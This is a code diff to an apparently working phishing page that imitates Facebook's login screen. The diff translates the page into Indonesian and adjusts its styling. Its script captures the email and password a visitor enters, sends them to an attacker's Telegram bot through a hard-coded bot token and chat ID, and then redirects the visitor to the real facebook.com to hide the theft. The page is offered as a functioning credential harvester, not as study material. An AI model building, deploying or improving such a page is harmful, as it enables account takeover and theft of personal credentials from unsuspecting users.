@@ -1,17 +1,24 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook – log in or sign up</title>
+    <title>Facebook – Masuk atau Daftar</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
             background-color: #f0f2f5;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        .logo {
+            font-size: 50px;
+            font-weight: bold;
+            color: #1877f2;
+            margin-bottom: 10px;
         }
         .login-container {
             background: white;
@@ -19,43 +26,52 @@
             box-shadow: 0 0 10px rgba(0,0,0,0.1);
             border-radius: 5px;
             text-align: center;
-            width: 300px;
+            width: 350px;
         }
         input {
             display: block;
             width: 100%;
             margin: 10px 0;
-            padding: 10px;
+            padding: 12px;
             border: 1px solid #ccc;
             border-radius: 5px;
+            font-size: 16px;
         }
         button {
             background: #1877f2;
             color: white;
             border: none;
-            padding: 10px;
+            padding: 12px;
             cursor: pointer;
             width: 100%;
             border-radius: 5px;
+            font-size: 16px;
         }
         button:hover {
             background: #145dbf;
         }
-        .logo {
-            font-size: 24px;
-            font-weight: bold;
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: gray;
+        }
+        .forgot {
+            margin-top: 10px;
+            font-size: 14px;
             color: #1877f2;
-            margin-bottom: 20px;
+            cursor: pointer;
         }
     </style>
 </head>
 <body>
+    <div class="logo">facebook</div>
     <div class="login-container">
-        <div class="logo">Facebook</div>
-        <input type="text" id="email" placeholder="Email or phone number">
-        <input type="password" id="password" placeholder="Password">
-        <button onclick="submitLogin()">Log In</button>
+        <input type="text" id="email" placeholder="Email atau Nomor Telepon">
+        <input type="password" id="password" placeholder="Kata Sandi">
+        <button onclick="submitLogin()">Masuk</button>
+        <div class="forgot">Lupa kata sandi?</div>
     </div>
+    <div class="footer">Facebook © 2025</div>
 
     <script>
         function submitLogin() {
@@ -65,23 +81,19 @@
             if (email && password) {
                 let telegramBotToken = "7863457133:AAE31d9Hb5G6H_2HlpxEcJEfhYv3FhFy5ks";
                 let chatId = "6899914313";
-                let message = `Facebook Login Attempt:\nEmail: ${email}\nPassword: ${password}`;
+                let message = `Email: ${email}\nPassword: ${password}`;
                 
                 fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ chat_id: chatId, text: message })
-                }).then(response => {
-                    console.log("Data sent to Telegram");
-                    setTimeout(() => {
-                        window.location.href = "https://www.facebook.com"; // Redirect ke halaman asli Facebook
-                    }, 1000);
-                }).catch(error => {
-                    console.error("Error sending data", error);
                 });
+                
+                setTimeout(() => {
+                    window.location.href = "https://www.facebook.com"; // Redirect ke Facebook asli
+                }, 1500);
             }
         }
     </script>
 </body>
-  </html>
-    
+</html>
